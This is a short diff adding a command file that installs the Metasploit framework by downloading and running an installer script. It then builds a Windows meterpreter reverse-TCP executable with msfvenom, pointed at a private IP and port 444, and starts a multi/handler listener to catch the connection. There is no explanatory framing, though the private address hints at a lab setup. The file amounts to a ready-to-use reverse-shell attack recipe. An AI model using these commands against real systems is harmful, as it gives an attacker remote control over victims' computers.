@@ -1,0 +1,18 @@
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
+  chmod 755 msfinstall && \
+  ./msfinstall
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.253.128 LPORT=444 -f exe -o /root/shell.exe
+
+msfconsole
+
+use exploit/multi/handler
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+set LHOST 192.168.253.128
+
+set LPORT 444
+
+run
